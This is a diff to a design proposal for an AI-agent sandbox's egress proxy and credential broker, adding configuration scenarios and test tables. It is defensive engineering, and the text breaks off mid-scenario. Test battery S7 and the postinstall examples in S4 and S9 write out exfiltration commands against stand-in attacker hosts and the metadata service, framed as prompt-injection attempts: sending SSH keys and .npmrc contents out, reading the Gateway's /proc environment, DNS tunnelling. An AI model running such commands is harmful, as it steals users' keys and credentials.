@@ -16,6 +16,8 @@ identifiers are inline code, as in FEP-5, and start above the highest drafted nu
 up to `FW-EGR15`, `FW-CRED15`, `FW-FID11`, `FW-INV14`, `FW-E2E-091` and `FW-ADV-020`; FEP-4 drafted
 `FW-INV12` and `FW-DISC7`–`FW-DISC10`. This FEP starts at `FW-EGR16`, `FW-CRED16`, `FW-FID12`,
 `FW-INV15`, `FW-E2E-092` and `FW-ADV-021`. Changes to FEP-5 or FEP-1 drafts are listed in §9.
+§7.2 walks through ten concrete configurations, from a model-API-only agent to a corporate proxy,
+each with a test form the harness runs as written.
 
 **The question that opened this FEP.** Omnigent does not use Envoy, Squid or mitmproxy. Its egress
 proxy is about 2,900 lines of its own Python (asyncio, the standard-library `ssl` module, and
@@ -439,8 +441,11 @@ mechanisms.
 **Custody.** While the vault holds any credential, the Gateway process is not dumpable: on Linux
 `prctl(PR_SET_DUMPABLE, 0)`, which makes reading its memory through `/proc/<pid>/mem` or `ptrace`
 require `CAP_SYS_PTRACE` whatever Yama and Landlock decide; on macOS `ptrace(PT_DENY_ATTACH)`
-**(characterize)** (`FW-CRED16`). The confined child is unaffected, since `execve` resets the flag
-for the new image.
+**(characterize)** (`FW-CRED16`). The flag is set before the workload is spawned, because the
+process's own environment, readable through `/proc/<pid>/environ` by a same-uid process, holds an
+env-sourced credential from the moment `formwork run` starts; a non-dumpable process's `/proc`
+entries belong to root. The confined child is unaffected, since `execve` resets the flag for the new
+image.
 
 **Presentation limits.** The engine never presents a credential on OPTIONS (`FW-CRED18`), and TRACE
 is refused outright on inspected hosts (`FW-EGR23`). It never presents a credential on a request it
@@ -481,14 +486,14 @@ the operator; the confined process receives the upstream response unchanged.
 
 ### 4.8 Protocol scope
 
-| Traffic | Treatment | Phase (§7.3) |
+| Traffic | Treatment | Phase (§7.4) |
 |---|---|---|
 | TLS to a tunnel host, any ALPN (HTTP/2, gRPC) | server-name check, then splice | A |
 | Plain HTTP (absolute-form, port 80 rule) | the inspected request pipeline without TLS; reported unencrypted per FEP-5 §4 | A |
 | HTTP/1.1 over TLS to an inspected host | terminate, match, broker, forward | B |
 | HTTP/2 to an inspected host | not offered in ALPN; clients fall back to HTTP/1.1. A ClientHello whose ALPN list excludes `http/1.1` is refused as `alpn` (`FW-EGR20`), and the operator line suggests tunnel grade for the host | spike-gated (§11) |
 | WebSocket over an inspected host | the upgrade GET is matched and brokered like any request; the engine splices the two sides only after the upstream answers `101` (the `pingora` defect, §2.3); frames pass uninspected, and the report line says so | C |
-| An operator's upstream proxy | the engine connects through the proxy named in `formwork run`'s own environment; the proxy resolves names, so address classification is `Partial` and the report says so (`FW-EGR26`) | C |
+| An operator's upstream proxy | the engine connects through the proxy named in `formwork run`'s own environment, except for hosts that environment's `NO_PROXY` exempts; the proxy resolves names, so address classification for proxied hosts is `Partial` and the report says so (`FW-EGR26`); the proxy's own address comes from the operator and is not classified (S6) | C |
 | HTTP/3 and QUIC | UDP is closed under host rules (FEP-5 `FW-ISO11`); clients fall back to TCP | — |
 | Non-HTTP TCP (SSH, database protocols) | refused under host rules; a port-scoped fd ([FW-GW6](../formwork.md#fw-gw6)) is the FEP-1 answer and has no grammar yet (§11) | — |
 
@@ -629,8 +634,8 @@ These continue the EGR, CRED, FID and INV families. One obligation per ID; ratio
 | `FW-EGR23` Reflective methods | On an inspected host, the Gateway shall refuse TRACE and CONNECT requests under every rule. |
 | `FW-EGR24` Upstream verification | The Gateway shall verify every upstream TLS certificate for the requested host name against the host trust store it loaded at session start, and shall never trust the session CA or a file a confined process can write for upstream verification. |
 | `FW-EGR25` Constrained session CA | The session CA certificate shall carry name constraints whose permitted subtrees are exactly the session's inspected exact names, wildcard suffixes and IP literals. |
-| `FW-EGR26` Upstream proxy | When `formwork run`'s environment names an upstream proxy, the Gateway shall send admitted egress through it and report destination classification `Partial` with the reason. |
-| `FW-CRED16` Broker custody | While it holds a brokered credential, the Gateway process shall be non-dumpable (Linux) or deny debugger attachment (macOS). |
+| `FW-EGR26` Upstream proxy | When `formwork run`'s environment names an upstream proxy, the Gateway shall send admitted egress through it, except to hosts that environment's `NO_PROXY` exempts, and shall report destination classification `Partial` with the reason for each proxied host. |
+| `FW-CRED16` Broker custody | When the blueprint brokers a credential, the Gateway process shall be non-dumpable (Linux) or deny debugger attachment (macOS) from before it spawns the workload until it exits. |
 | `FW-CRED17` Reflection guard | For a response to a request on which it presented a brokered credential, the Gateway shall request identity content coding, refuse a response with another content coding, and end the response without releasing any byte that begins an occurrence of a wire encoding of the presented credential. |
 | `FW-CRED18` No credential on OPTIONS | The Gateway shall not present a brokered credential on an OPTIONS request. |
 | `FW-CRED19` No credential in cleartext | The Gateway shall present a brokered credential only on a request it forwards to the upstream over TLS. |
@@ -660,8 +665,507 @@ no external network).
 - **Upstream trust.** Fixture upstreams present certificates from a test CA. The harness sets
   `SSL_CERT_FILE` in `formwork run`'s own environment, which the engine honors (§4.12), so no
   test-only switch enters the binary.
+- **Fixture upstreams.** Loopback HTTPS servers that record every handshake and request (method,
+  path, query, headers) to a log the test reads after the process tree exits. The scenarios use
+  `/ok` (a fixed body), `/sse` (one server-sent event every 200 ms), `/reflect` (echoes the request
+  headers in the body, into a response header with `?in=header`, compressed with `?gzip=1`), a
+  wrapper around `git http-backend`, static package-registry trees, and a CONNECT-proxy fixture that
+  records each CONNECT line.
+- **`fw-egress-probe`.** A fixture binary beside `fw-mcp-fixture` for traffic ordinary clients do not
+  produce: a CONNECT to one host followed by a ClientHello naming another (`tunnel … --sni`), a
+  mismatched `Host` inside an inspected tunnel (`inspect … --host`), a non-TLS first byte, an
+  `h2`-only ALPN offer, and the raw heads of `FW-ADV-024`.
+- **Names.** Each scenario is written with the hosts an operator would use. Its test form replaces
+  each with a `.test` name that the resolver fixture maps to a fixture, and replaces a Catalog
+  `broker:` entry with an inline binding (FEP-5 `FW-BP12`), because Catalog bindings name production
+  hosts.
+- **Wildcard success paths.** Under `FW-EGR19` a wildcard-matched host cannot resolve to a local or
+  host address, so a loopback fixture cannot serve one. On Linux the harness runs those fixtures in
+  a separate network namespace behind a veth pair, at an address outside every refused class that is
+  routed nowhere else. On macOS those rows run their refusal half only; the engine code is shared.
+- **Assertions.** Refusals are asserted on violation records (reason and host), never on the prose
+  of operator lines, whose wording may change (constitution Data model).
 
-### 7.2 Tests
+### 7.2 Scenarios
+
+Each scenario is a configuration an operator would write, where it fits, how the engine serves it,
+and a test form the harness runs as written. The transcripts and expected results are specified,
+not captured: the engine does not exist yet. Several scenarios overlap FEP-5's `FW-E2E-075`, `077`,
+`078`, `084` and `085` and the tests in §7.3; each names the overlap and adds the integrated flow.
+Each test form lists steps run inside the session (`formwork run --blueprint <file> -- sh -c ...`)
+unless marked "outside", and is checked after the process tree exits.
+
+| # | Scenario | Grade | Brokering | Phase | Test |
+|---|---|---|---|---|---|
+| S1 | The agent reaches its model API and nothing else | tunnel | none | A | `FW-E2E-098` |
+| S2 | The agent never holds its API key | inspected | `broker:anthropic` | B | `FW-E2E-099` |
+| S3 | Push and open pull requests in one repository | inspected | `broker:github` | B | `FW-E2E-100` |
+| S4 | Dependency installs from public registries | tunnel | none | A | `FW-E2E-101` |
+| S5 | Read-only documentation research | inspected, wildcard | none | B | `FW-E2E-102` |
+| S6 | Corporate network: intranet by name, egress through the corporate proxy | tunnel | none | C | `FW-E2E-103` |
+| S7 | Exfiltration attempts against S2 | inspected | `broker:anthropic` | B | `FW-ADV-025` |
+| S8 | Blueprints the compiler refuses | — | — | A, B | `FW-E2E-104` |
+| S9 | Bootstrapping a CI allowlist with `learn` | tunnel | none | A | `FW-E2E-105` |
+| S10 | A test server inside the session | — | — | blocked on §11 | `FW-E2E-106` |
+
+#### S1. The agent reaches its model API and nothing else
+
+**Configuration.**
+
+```toml
+# examples/blueprints/agent-session.toml after FEP-5 and this FEP
+extends = ["builtin:default"]
+rules = [
+  "readwrite:$CWD/**",
+  "readwrite:~/.claude/**",          # Claude Code's own state
+  "https:api.anthropic.com",         # tunnel grade: this host, any request, no TLS termination
+]
+allow-credentials = ["anthropic", "claude"]   # unchanged: the agent holds its own key
+```
+
+**Where it fits.** This replaces `net = { ports = [443] }` in the shipped agent examples. That line
+admits every HTTPS host, cloud metadata included, which FEP-1 names as the reason to migrate. With one
+host rule the agent keeps its model API and loses everything else. Tunnel grade needs no CA, so every
+client works unchanged, including those that verify through Security.framework on macOS (`gh`, Swift
+tools). It is the starting point for most sessions; `learn` extends it (S9).
+
+**How it works.**
+
+1. The Launcher sets the proxy variables and `NODE_USE_ENV_PROXY=1` (§4.11). No host is inspected, so
+   no CA is generated and no CA variable is set.
+2. Claude Code sends `CONNECT api.anthropic.com:443`. The engine parses the authority, finds the
+   tunnel rule, resolves the name, and classifies every address (§4.5).
+3. The engine replies `200`, reads the ClientHello, confirms that its server name is
+   `api.anthropic.com`, connects to a checked address and splices. TLS runs end to end between Claude
+   Code and Anthropic.
+4. Any other CONNECT gets `403`. A direct `connect()` is refused by the supervisor on Linux and by
+   Seatbelt on macOS, and nothing resolves locally (FEP-5 `FW-EGR12`).
+
+```console
+$ formwork run -- sh -c 'curl -sS -o /dev/null -w "%{http_code}\n" https://api.anthropic.com/v1/models
+                         curl -sS https://example.com/'
+401
+curl: (56) CONNECT tunnel failed, response 403
+WARN formwork{cmd="run"}: egress refused reason="host-not-listed" host="example.com" port=443 explain="formwork explain https://example.com/"
+```
+
+The `401` is Anthropic's answer to a request without a key: the tunnel reached the host. The
+`WARN` line is on the operator channel; the agent saw only curl's error.
+
+**Test form — `FW-E2E-098` (Phase A, both OSes).** `api.anthropic.com` becomes `model.test`;
+`blocked.test` is a second fixture.
+
+| # | Step | Expected |
+|---|---|---|
+| 0 | outside: `formwork explain --net` | one host, `model.test`, grade tunnel, deciding rule `https:model.test`; no session CA path |
+| 1 | `curl -sS https://model.test/ok` | the fixture's body; the fixture logs one request |
+| 2 | `curl -sS https://blocked.test/ok` | curl exit 56, `CONNECT tunnel failed, response 403`; violation `host-not-listed`; `blocked.test` logs nothing |
+| 3 | `curl -sS https://169.254.169.254/latest/meta-data/` | curl exit 56; violation `host-not-listed` (the case `ports = [443]` admits) |
+| 4 | `curl -sS --noproxy '*' https://<model.test's fixture address>/ok` | curl exit 7; Linux supervisor or macOS Seatbelt refusal record; the fixture logs nothing |
+| 5 | `python3 -c 'import socket; socket.getaddrinfo("model.test", 443)'` | `socket.gaierror` |
+| 6 | `fw-egress-probe tunnel model.test:443 --sni blocked.test` | violation `sni-mismatch`; neither fixture logs a handshake |
+
+Pass: every row as stated. Fail: any row differs.
+
+#### S2. The agent never holds its API key
+
+**Configuration.**
+
+```toml
+extends = ["builtin:default"]
+rules = [
+  "readwrite:$CWD/**",
+  "any:api.anthropic.com/**",        # inspected: brokering needs TLS termination (FEP-5 FW-CRED12)
+]
+allow-credentials = ["broker:anthropic"]
+```
+
+**Where it fits.** An unattended agent, a CI job, or a script using an Anthropic SDK with
+`ANTHROPIC_API_KEY`. The key stays in the Gateway, so a prompt-injected `env`, `printenv` or upload of
+the environment reveals a placeholder that works nowhere else. Claude Code brokers `anthropic` only
+in its API-key mode; in OAuth mode it lifts `claude` and brokers nothing (FEP-5 §3.2).
+
+**How it works.**
+
+1. At start, the Gateway reads `ANTHROPIC_API_KEY` from `formwork run`'s environment into the vault
+   and makes itself non-dumpable before the workload is spawned (`FW-CRED16`).
+2. The Launcher strips the variable, runs the scrub, then sets
+   `ANTHROPIC_API_KEY=fwcred-anthropic-<nonce>` (FEP-5 `FW-CRED14`).
+3. The Gateway generates the session CA, name-constrained to `api.anthropic.com`, writes the bundle
+   (host roots plus the CA) to the session scratch, and the Launcher points the CA variables at it.
+4. The SDK sends `CONNECT api.anthropic.com:443`. The engine checks the server name, mints the leaf on
+   first use, and completes the handshake with ALPN `http/1.1`.
+5. `POST /v1/messages` arrives with `x-api-key: fwcred-anthropic-<nonce>`. The method and path match
+   `any:`; the placeholder is bound to this host, so the engine puts the key in `x-api-key`, sets
+   `Accept-Encoding: identity`, and forwards over the pooled upstream connection.
+6. The server-sent-event response streams back through the reflection guard (§4.7), event by event.
+
+**Test form — `FW-E2E-099` (Phase B, both OSes; extends FEP-5 `FW-E2E-078`).** `api.anthropic.com`
+becomes `model.test`. Catalog bindings name production hosts, so the test uses an inline binding
+(FEP-5 `FW-BP12`):
+`allow-credentials = [{ name = "model-fixture", env = "FIXTURE_MODEL_KEY", hosts = ["model.test"], scheme = "header:x-api-key" }]`,
+with `FIXTURE_MODEL_KEY` set to a random 40-character value in `formwork run`'s environment. A second
+fixture, `other.test`, is admitted by `get:other.test/**`.
+
+| # | Step | Expected |
+|---|---|---|
+| 1 | `printenv FIXTURE_MODEL_KEY` | a `fwcred-` placeholder, not the value the harness set |
+| 2 | `curl -sS -H "x-api-key: $FIXTURE_MODEL_KEY" https://model.test/ok` | the fixture's body; the fixture logs `x-api-key` equal to the harness's value |
+| 3 | `curl -sS https://model.test/ok` | the fixture logs the harness's value in `x-api-key` (added when absent) |
+| 4 | `curl -sS -N -H "x-api-key: $FIXTURE_MODEL_KEY" https://model.test/sse` | 150 events; each reaches curl within 20 ms of the fixture writing it (`FW-E2E-093`) |
+| 5 | `curl -sS -H "x-api-key: $FIXTURE_MODEL_KEY" https://other.test/ok` | `403`; violation `placeholder`; `other.test` logs nothing |
+| 6 | `curl -sS -X OPTIONS https://model.test/ok` | the fixture logs the request without `x-api-key` (`FW-CRED18`) |
+| 7 | after exit: search the session scratch, `$TMPDIR` and the workload's captured output for the harness's value | no match (FEP-5 `FW-INV13`) |
+
+Pass: every row as stated. Fail: any row differs.
+
+#### S3. Push and open pull requests in one repository
+
+**Configuration.**
+
+```toml
+extends = ["builtin:default"]
+rules = [
+  "readwrite:$CWD/**",
+  # git smart HTTP for this repository: info/refs (GET), upload-pack and receive-pack (POST)
+  "get,post:github.com/acme/widgets.git/**",
+  # REST for this repository: read, open and update pull requests, comment
+  "get:api.github.com/repos/acme/widgets/**",
+  "post:api.github.com/repos/acme/widgets/pulls",
+  "patch:api.github.com/repos/acme/widgets/pulls/*",
+  "post:api.github.com/repos/acme/widgets/issues/*/comments",
+  "deny:api.github.com/repos/acme/widgets/actions/**",   # no workflow runs, logs or artifacts
+]
+allow-credentials = ["broker:github"]
+```
+
+**Where it fits.** An agent that works a ticket end to end: clone, branch, commit, push, open a pull
+request, answer review comments. The token never enters the session, and the path rules confine its
+use to one repository even when the token itself (a classic personal token, or `gh auth token`)
+covers the whole account.
+
+**How it works.**
+
+1. `git clone https://github.com/acme/widgets.git` sends
+   `GET /acme/widgets.git/info/refs?service=git-upload-pack` with no `Authorization`. The rule matches
+   (the query is not part of the match), and the engine adds `Authorization: Basic` with user
+   `x-access-token` and the token, the scheme the Catalog binds to
+   `github.com`. Git needs no credential helper.
+2. `git push` sends `GET …/info/refs?service=git-receive-pack`, then `POST …/git-receive-pack`,
+   whose body is chunked when the pack exceeds `http.postBuffer` (1 MiB by default); the body
+   streams (`FW-EGR21`).
+3. `POST /repos/acme/widgets/pulls` to `api.github.com` gets `Authorization: Bearer`, the scheme bound
+   to that host.
+4. A push to `acme/other.git` or a `DELETE /repos/acme/widgets` is refused with `403` (`path`,
+   `method`); a request under `/actions/` is refused by the terminal `deny`.
+
+Two limits apply. `gh pr create` uses GraphQL (`POST api.github.com/graphql`), a single endpoint for
+every repository; admitting it admits any mutation the token allows, so path rules cannot scope it.
+Scope the token itself to the repository (a fine-grained token), or use the REST endpoints above. On
+macOS `gh` verifies through Security.framework and refuses the session CA (FEP-5 §3.2); `git` and
+`curl` read the CA variables.
+
+**Test form — `FW-E2E-100` (Phase B, both OSes).** `github.com` becomes `git.test`, a fixture that
+wraps `git http-backend` over bare repositories `acme/widgets.git` and `acme/other.git` and accepts
+pushes only with the fixture token. `api.github.com` becomes `api.git.test`, a REST fixture. An
+inline binding carries one scheme, so the test uses two:
+`{ name = "git-fixture", env = "FIXTURE_GIT_TOKEN", hosts = ["git.test"], scheme = "basic" }` and
+`{ name = "api-fixture", env = "FIXTURE_API_TOKEN", hosts = ["api.git.test"], scheme = "bearer" }`.
+
+| # | Step | Expected |
+|---|---|---|
+| 1 | `git clone https://git.test/acme/widgets.git` | succeeds; the fixture logs `Basic` with the fixture token on the first request |
+| 2 | commit a 2 MiB random file; `git push origin HEAD:agent/1` | succeeds; `acme/widgets.git` has `agent/1` with the blob; the receive-pack body arrived chunked and byte-identical (`FW-E2E-092`) |
+| 3 | `curl -sS -X POST https://api.git.test/repos/acme/widgets/pulls -d '{"head":"agent/1","base":"main","title":"t"}'` | `201` from the fixture; the fixture logs `Bearer` with the API token |
+| 4 | `git push https://git.test/acme/other.git HEAD:x` | fails with HTTP 403; violation `path`; `acme/other.git` unchanged |
+| 5 | `curl -sS -X DELETE https://api.git.test/repos/acme/widgets` | `403`; violation `method` |
+| 6 | `curl -sS https://api.git.test/repos/acme/widgets/actions/runs` | `403`; violation `path`, deciding rule the `deny` line |
+| 7 | `git config --get-regexp credential; printenv \| grep FIXTURE_` | no credential helper; placeholders only |
+
+Pass: every row as stated. Fail: any row differs.
+
+#### S4. Dependency installs from public registries
+
+**Configuration.**
+
+```toml
+extends = ["builtin:default"]
+rules = [
+  "readwrite:$CWD/**",
+  "readwrite:~/.npm/**",
+  "readwrite:~/.cache/pip/**",
+  "https:registry.npmjs.org",
+  "https:pypi.org",
+  "https:files.pythonhosted.org",
+]
+```
+
+**Where it fits.** `npm ci`, `pip install -r requirements.txt` or `uv sync` in CI, or in an agent's
+setup step. Install scripts (`postinstall`, `setup.py`) run confined and reach only the registries.
+Tunnel grade needs no session CA, so each client keeps its own trust store (pip's system-store
+default and `uv` included) and the lockfile's integrity hashes verify the contents.
+
+**How it works.**
+
+1. npm and pip send `CONNECT` for each registry host; the engine checks names and splices, as in S1.
+2. A `postinstall` script that fetches `https://evil.example/stage2` gets `403`; one that opens a raw
+   socket to an address gets `EACCES` from the supervisor (Linux) or a Seatbelt denial (macOS).
+3. A dependency fetched from another host (a git dependency on `codeload.github.com`) fails with
+   `host-not-listed`; the operator line names the host, and `learn` proposes it (S9).
+4. A wildcard rule (`https:*.example-cdn.net`) admits every subdomain, but never one whose DNS
+   answer is a local or private address (§4.5): an attacker who controls a subdomain cannot point it
+   at the runner's metadata service or its loopback.
+
+**Test form — `FW-E2E-101` (Phase A, both OSes; row 3 Linux only, §7.1).** `registry.npmjs.org`
+becomes `npm.test`, a static registry fixture serving `fixture-pkg`, whose `postinstall` runs
+`curl -sS https://evil.test/stage2 || true; node -e "require('net').connect(443, '198.51.100.7')"`.
+`pypi.org` and `files.pythonhosted.org` become `pypi.test` (a static simple index) and
+`files.pypi.test`. The blueprint also carries `https:*.cdn.test`.
+
+| # | Step | Expected |
+|---|---|---|
+| 1 | `npm install --registry https://npm.test/ fixture-pkg` | succeeds; `node_modules/fixture-pkg` exists; `evil.test` logs nothing; violations `host-not-listed` (`evil.test`) and, on Linux, a supervisor refusal for `198.51.100.7:443` |
+| 2 | `pip download --no-deps --index-url https://pypi.test/simple/ fixture-pkg` | the wheel downloads from `files.pypi.test` |
+| 3 | `curl -sS https://mirror.cdn.test/ok`, answered with the namespace fixture's address | the fixture's body |
+| 4 | `curl -sS https://evil.cdn.test/ok`, answered with `127.0.0.1` | curl exit 56; violation `address-class` |
+| 5 | outside: `formwork explain --json` | four hosts at tunnel grade; no session CA |
+
+Pass: every row as stated. Fail: any row differs.
+
+#### S5. Read-only documentation research
+
+**Configuration.**
+
+```toml
+extends = ["builtin:default"]
+rules = [
+  "readwrite:$CWD/**",
+  "get,head:docs.python.org/**",
+  "get,head:developer.mozilla.org/**",
+  "get,head:*.readthedocs.io/**",
+  "https:api.anthropic.com",
+]
+```
+
+**Where it fits.** A research agent, or a documentation MCP server wrapped by `formwork gateway`,
+that reads pages. GET-only rules let it read these hosts and nothing else: it cannot POST a form,
+upload a file or send a request body carrying repository contents to them.
+
+A GET still carries data in its path and query, to the host's logs. With an exact name that is the
+documentation host's operator. A wildcard over a domain where anyone can publish, such as
+`*.readthedocs.io`, admits hosts an attacker can register, so a GET to a subdomain the attacker owns
+reaches the attacker. The class table blocks private addresses, not attacker-owned content. Prefer
+exact names for user-content domains.
+
+**How it works.**
+
+1. The session CA carries name constraints for `docs.python.org`, `developer.mozilla.org` and the
+   `readthedocs.io` subtree (`FW-EGR25`).
+2. Each request is matched on method; the path is unrestricted (`/**`).
+3. A leaf is minted for each subdomain the first time it is used.
+4. `api.anthropic.com` stays tunnel grade; each host has exactly one grade (FEP-5 `FW-BP14`).
+
+**Test form — `FW-E2E-102` (Phase B, both OSes; row 5 Linux only).** `docs.python.org` becomes
+`docs.test`; `*.readthedocs.io` becomes `*.rtd.test`; `api.anthropic.com` becomes `model.test`.
+
+| # | Step | Expected |
+|---|---|---|
+| 1 | `curl -sS https://docs.test/3/library/` | the fixture's body |
+| 2 | `curl -sS -I https://docs.test/3/` | `200` for HEAD |
+| 3 | `curl -sS -X POST -d q=1 https://docs.test/search` | `403`; violation `method`; the fixture logs nothing |
+| 4 | `curl -sS -X TRACE https://docs.test/` | `403`; violation `method` (`FW-EGR23`) |
+| 5 | `curl -sS https://proj.rtd.test/en/latest/`, answered with the namespace fixture's address | the fixture's body; the leaf's issuer is the session CA |
+| 6 | `curl -sS https://rtd.test/` | curl exit 56; violation `host-not-listed` (a wildcard excludes the apex) |
+| 7 | `curl -sS https://model.test/ok` | the fixture's body; the fixture logs the client's own handshake, so the tunnel was not terminated |
+
+Pass: every row as stated. Fail: any row differs.
+
+#### S6. Corporate network: intranet by name, egress through the corporate proxy
+
+**Configuration.**
+
+```toml
+extends = ["builtin:default"]
+rules = [
+  "readwrite:$CWD/**",
+  "https:api.anthropic.com",
+  "https:git.corp.internal",         # resolves to 10.20.0.5; admitted because the rule is an exact name
+  "https:artifacts.corp.internal",
+]
+```
+
+`formwork run`'s own environment, set by the operator's machine:
+
+```sh
+export HTTPS_PROXY=http://proxy.corp.internal:3128
+export NO_PROXY=.corp.internal
+export SSL_CERT_FILE=/etc/corp/ca-bundle.pem   # public roots plus the corporate TLS-inspection root
+```
+
+**Where it fits.** Enterprise laptops and runners where direct internet egress is blocked, a
+corporate proxy is mandatory (often one that inspects TLS), and internal services have private
+addresses.
+
+**How it works.**
+
+1. The engine loads upstream trust from `SSL_CERT_FILE` (§4.12). The operator's variable also reaches
+   the session, so the agent's clients trust the corporate inspection root that will sign the
+   certificates they see through the tunnel.
+2. `CONNECT api.anthropic.com:443` matches a tunnel rule and `NO_PROXY` does not exempt it, so the
+   engine sends `CONNECT api.anthropic.com:443` to `proxy.corp.internal:3128` and splices. The
+   corporate proxy resolves the name, so address classification for this host is `Partial`
+   (`FW-EGR26`), and the report says so.
+3. `CONNECT git.corp.internal:443` is exempted by `NO_PROXY`. The engine resolves it, gets
+   `10.20.0.5`, and admits the private address because the rule is an exact name (`FW-EGR19`).
+4. A rule `https:*.corp.internal` would refuse `10.20.0.5` as `address-class`: wildcards never reach
+   private addresses.
+5. The proxy's own address comes from the operator's environment and is not classified. The agent
+   cannot reach the proxy itself; a direct `connect()` to it is refused like any other.
+
+*Variant: stacked under Omnigent* (`docs/omnigent-integration-eval.md`, Option B). Omnigent's
+in-namespace relay is the upstream proxy (`HTTPS_PROXY`), and Omnigent's MITM CA arrives through
+`SSL_CERT_FILE`, so the same mechanism chains Formwork's engine into Omnigent's. Both allowlists
+apply, so a host must pass both. If both layers broker the same credential, Formwork adds the header
+first and Omnigent, which never overwrites a present header, forwards it.
+
+**Test form — `FW-E2E-103` (Phase C, both OSes).** `proxy.test` is a CONNECT-proxy fixture that
+records each CONNECT line and forwards to the fixture addresses. `model.test` is reached through it.
+`git.corp.test` is a fixture on `127.0.0.2`. `formwork run` gets `HTTPS_PROXY=http://proxy.test:3128`
+and `NO_PROXY=.corp.test`.
+
+| # | Step | Expected |
+|---|---|---|
+| 1 | `curl -sS https://model.test/ok` | the fixture's body; `proxy.test` logs `CONNECT model.test:443` |
+| 2 | `curl -sS https://git.corp.test/ok` | the fixture's body; `proxy.test` logs nothing for it |
+| 3 | `curl -sS --noproxy '*' http://<proxy.test's address>:3128/` | curl exit 7; refusal record; `proxy.test` logs nothing |
+| 4 | outside: `formwork explain --json` | `model.test` classification `Partial`, reason naming the upstream proxy; `git.corp.test` `Enforced` |
+| 5 | a second blueprint with only `https:*.corp.test`: `curl -sS https://git.corp.test/ok` | curl exit 56; violation `address-class` |
+
+Pass: every row as stated. Fail: any row differs.
+
+#### S7. Exfiltration attempts against S2
+
+**Setup.** S2's test form, with the planted fake credentials of FEP-2's fixture home, an attacker
+fixture `attacker.test` that is not admitted, and `model.test` serving `/reflect` (echoes request
+headers in the body; `?gzip=1` compresses; `?in=header` echoes into a response header).
+
+**Where it fits.** This is the prompt-injection threat the configuration exists for, as one battery.
+Each row names the mechanism that stops it, and the last row is what the configuration admits by
+design.
+
+**Test form — `FW-ADV-025` (Phase B, both OSes).**
+
+| # | Attempt | Step | Expected | Mechanism |
+|---|---|---|---|---|
+| 1 | send a key file to an unlisted host | `curl -sS -d @$HOME/.ssh/id_ed25519 https://attacker.test/` | the read fails with `EACCES`, and the CONNECT gets `403` | credential floor; `host-not-listed` |
+| 2 | read the key back through an echo | `curl -sS -H "x-api-key: $FIXTURE_MODEL_KEY" https://model.test/reflect` | connection reset; violation `reflection`; no 8-byte run of the key in curl's output | `FW-CRED17` |
+| 3 | echo into a header | `…/reflect?in=header` | as row 2 | `FW-CRED17` |
+| 4 | echo compressed | `…/reflect?gzip=1` | response refused; violation `reflection` | identity coding |
+| 5 | carry the placeholder in a query | `curl -sS "https://other.test/?k=$FIXTURE_MODEL_KEY"` | `403`; violation `placeholder` | placeholder scan |
+| 6 | raw socket to an address | `python3 -c 'import socket; socket.create_connection(("198.51.100.7", 443))'` | `PermissionError`; refusal record | supervisor (Linux), Seatbelt (macOS) |
+| 7 | DNS tunnel | `python3 -c 'import socket; socket.socket(socket.AF_INET, socket.SOCK_DGRAM)'` and `getaddrinfo("c2VjcmV0.attacker.test", 53)` | `PermissionError`; `gaierror` | FEP-5 `FW-ISO11`, `FW-EGR12` |
+| 8 | read the Gateway's environment or memory | `cat /proc/$PPID/environ`; `head -c1 /proc/$PPID/mem` (Linux); `ps -E -p $PPID` (macOS) | permission denied on Linux; no environment shown on macOS **(characterize)** | `FW-CRED16`; FEP-5 `FW-ISO16` |
+| 9 | front a blocked host behind an admitted name | `fw-egress-probe inspect model.test:443 --host attacker.test` | `403`; violation `host-mismatch` | FEP-5 `FW-EGR10` |
+| 10 | ask a host service to fetch | `xdg-open "https://attacker.test/?d=1"` (Linux), `open` (macOS) | refused; `attacker.test` logs nothing | FEP-5 channel baseline (`FW-ADV-020`) |
+| 11 | send code to the model host | `curl -sS -H "x-api-key: $FIXTURE_MODEL_KEY" -d @src/main.rs https://model.test/v1/messages` | succeeds | admitted by design: an admitted host receives what the agent sends; the floor and the environment scrub bound what the agent has |
+
+Pass: rows 1–10 refused with their records and `attacker.test` logs nothing; row 11 succeeds. Fail:
+any refusal row reaches a fixture, or a key byte sequence reaches the session.
+
+#### S8. Blueprints the compiler refuses
+
+**Where it fits.** A team reviewing a shared blueprint, or an embedder generating one. Each row is a
+mistake that would otherwise produce a sandbox other than the one written; the compiler refuses it
+and names the lines, before anything runs.
+
+**Test form — `FW-E2E-104` (Phase A for rows 1 and 4–8; Phase B for rows 2 and 3; pure compile,
+both OSes).** Each row runs outside the session: `formwork compile --report-only --blueprint <file>`.
+
+| # | Blueprint lines | Expected | Rule |
+|---|---|---|---|
+| 1 | `rules = ["https:api.github.com", "get:api.github.com/repos/**"]` | refused; the message names both lines | one host, one grade (FEP-5 `FW-BP14`) |
+| 2 | `rules = ["https:github.com"]` and `allow-credentials = ["broker:github"]` | refused; the message names the lines to add, `any:github.com/**` and `any:api.github.com/**` | FEP-5 `FW-CRED12` |
+| 3 | `rules = ["get:status.corp.internal:80/**"]` and an inline binding bound to `status.corp.internal` | refused; the message names the port-80 rule | `FW-CRED19`, §9 (i) |
+| 4 | `net = { ports = [443] }` and `rules = ["https:api.anthropic.com"]` | refused | FEP-5 `FW-BP13` |
+| 5 | `rules = ["https:api.github.com", "deny:api.github.com/repos/acme/secret/**"]` | refused; a path `deny` needs an inspected rule | FEP-5 `FW-BP14` |
+| 6 | `rules = ["https:*"]` | refused at parse; the message states the host grammar | FEP-5 §4 |
+| 7 | `rules = ["https:api.anthropic.com/v1/**"]` | refused at parse; a path needs a method verb (`any:` for all methods) | FEP-5 §4 |
+| 8 | `rules = ["deny:telemetry.example.com"]` and no admitting rule | compiles; the report states that egress is denied | [FW-EGR2](fep-1.md#fw-egr2) |
+
+Pass: each row's outcome and named lines as stated. Fail: any row compiles when refusal is stated,
+or the reverse.
+
+#### S9. Bootstrapping a CI allowlist with `learn`
+
+**Configuration**, the first draft of a new pipeline's `ci.toml`:
+
+```toml
+extends = ["builtin:default"]
+rules = ["readwrite:$CWD/**", "https:registry.npmjs.org"]
+```
+
+```sh
+formwork learn --blueprint ci.toml -- npm ci
+```
+
+**Where it fits.** The first runs of a new pipeline or agent task, when the host list is unknown.
+`learn` runs the workload enforced, turns `host-not-listed` refusals into proposed rules, and the
+operator accepts them entry by entry (FEP-5 `FW-DISC12`,
+[FW-DISC5](../formwork.md#fw-disc5)).
+
+**How it works.** Suppose one dependency is a git dependency fetched from `codeload.github.com`, and a
+compromised package's `postinstall` requests
+`https://telemetry.evil.example/?d=$(base64 < ~/.npmrc)` and
+`http://169.254.169.254/latest/meta-data/iam/`.
+
+1. The `codeload.github.com` fetch is refused; `learn` proposes `https:codeload.github.com`.
